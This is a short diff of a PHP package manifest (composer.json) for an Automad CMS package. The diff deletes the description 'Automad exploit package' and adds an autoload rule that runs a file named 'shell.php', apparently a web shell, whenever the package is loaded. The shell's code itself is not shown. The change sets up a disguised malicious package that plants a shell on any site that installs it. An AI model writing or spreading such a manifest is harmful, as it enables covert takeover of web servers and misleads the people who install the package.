@@ -1,5 +1,7 @@
 {
     "name": "lso136/test",
-    "description": "Automad exploit package",
-    "type": "automad-package"
+    "type": "automad-package",
+    "autoload": {
+        "files": ["shell.php"]
+    }
 }
